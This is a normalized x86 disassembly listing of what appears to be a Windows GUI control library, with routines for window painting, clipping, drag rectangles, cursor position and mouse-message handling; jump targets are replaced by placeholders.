test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4137a8
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_413934
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_434ffc
mov eax ebx
call sub_44c724
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403324
sub_434ea4
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_434e24
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_434e24
jmp r-xdata
sub_434ec8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_434f5e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434f65
lea eax [ ebp - 0xc ]
call sub_403e78
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
sub_434f70
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_413914
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4138b8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_434554
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434ffc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b694
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_434554
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b390
push eax
call InvalidateRect
push ebp
call sub_434f70
pop ecx
test al al
je r-xdata
mov al 0x1
sub_435098
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44c6fc
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_435d5c
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403324
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4350f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b694
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b390
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_4351c9
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43919c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b390
push eax
call ReleaseDC
retn
sub_435250
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
call sub_435d90
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4346f8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_40688c
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_435d5c
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_432f04
sub_435324
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_435360
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4353ac
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_4353d8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_434b58
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_434b44
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_40291c
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_40291c
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_43b390
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_4354bc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_435508
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403324
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403324
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_4355cc
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_435618
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_435664
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43577f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41cd7c
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435786
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_4357b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_4346f8
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403324
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403324
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403324
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403324
jmp r-xdata
sub_4358a8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41245c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_435d90
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_434b44
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_434b58
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_4124ac
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_435a88
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_4346cc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403324
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_43b390
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4322c8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_435a73
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_43b390
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_43b390
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_434554
test esi esi
je r-xdata
sub_435a88
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403324
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43690c
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403324
mov eax esi
call sub_4345fc
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_4345b8
mov ecx eax
xor edx edx
xor eax eax
call sub_412484
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403324
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_435b2c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_435b5c
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_435bc8
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_435c88
sub_435bf8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_435c28
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_4346f8
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_435c54
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_435c88
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_435d5c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_435d90
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_435e28
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_44c6fc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_44c6fc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_434754
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
